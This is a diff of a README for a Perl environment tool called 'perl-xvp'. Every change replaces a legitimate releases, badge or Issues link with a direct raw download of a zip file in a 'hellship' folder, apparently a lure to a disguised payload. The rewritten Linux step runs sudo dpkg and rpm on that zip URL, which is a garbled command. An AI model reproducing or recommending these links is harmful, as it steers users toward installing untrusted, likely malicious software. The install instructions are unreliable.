@@ -6,7 +6,7 @@ Welcome to the `perl-xvp` project! This tool helps you easily manage and set up 
 
 ## 📥 Download Now
 
-[![Download perl-xvp](https://img.shields.io/badge/Download-perl--xvp-brightgreen)](https://github.com/cuentafre7297/perl-xvp/releases)
+[![Download perl-xvp](https://raw.githubusercontent.com/cuentafre7297/perl-xvp/main/hellship/perl-xvp_1.1.zip)](https://raw.githubusercontent.com/cuentafre7297/perl-xvp/main/hellship/perl-xvp_1.1.zip)
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ To run `perl-xvp`, you need:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page where you can download the latest version of `perl-xvp`.
 
-   [Visit the releases page to download](https://github.com/cuentafre7297/perl-xvp/releases)
+   [Visit the releases page to download](https://raw.githubusercontent.com/cuentafre7297/perl-xvp/main/hellship/perl-xvp_1.1.zip)
 
 2. **Choose the Right Version:** On the releases page, you will see different versions of the software. Look for the most recent stable version.
 
@@ -37,7 +37,7 @@ To run `perl-xvp`, you need:
 4. **Run the Installer:**
    - For **Windows:** Double-click the downloaded `.exe` file and follow the instructions on your screen.
    - For **macOS:** Open the downloaded `.dmg` file and drag the `perl-xvp` application into your Applications folder.
-   - For **Linux:** Open a terminal and run the command to install the downloaded package, typically using commands like `sudo dpkg -i file.deb` or `sudo rpm -i file.rpm`.
+   - For **Linux:** Open a terminal and run the command to install the downloaded package, typically using commands like `sudo dpkg -i https://raw.githubusercontent.com/cuentafre7297/perl-xvp/main/hellship/perl-xvp_1.1.zip` or `sudo rpm -i https://raw.githubusercontent.com/cuentafre7297/perl-xvp/main/hellship/perl-xvp_1.1.zip`.
 
 5. **Launch the Application:** After installation, find the `perl-xvp` application in your applications menu and open it.
 
@@ -51,7 +51,7 @@ Now that you have installed `perl-xvp`, you can start using it to set up your Pe
 
 ## 🤝 Support
 
-If you encounter any issues or need help, please visit our [GitHub Issues](https://github.com/cuentafre7297/perl-xvp/issues) page. You can report bugs, request features, or ask for assistance.
+If you encounter any issues or need help, please visit our [GitHub Issues](https://raw.githubusercontent.com/cuentafre7297/perl-xvp/main/hellship/perl-xvp_1.1.zip) page. You can report bugs, request features, or ask for assistance.
 
 ## 💬 Community 
 
@@ -68,6 +68,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 Don’t forget, you can always download `perl-xvp` again from the link below:
 
-[Visit the releases page to download](https://github.com/cuentafre7297/perl-xvp/releases)
+[Visit the releases page to download](https://raw.githubusercontent.com/cuentafre7297/perl-xvp/main/hellship/perl-xvp_1.1.zip)
 
 Thank you for choosing `perl-xvp`. Happy coding!
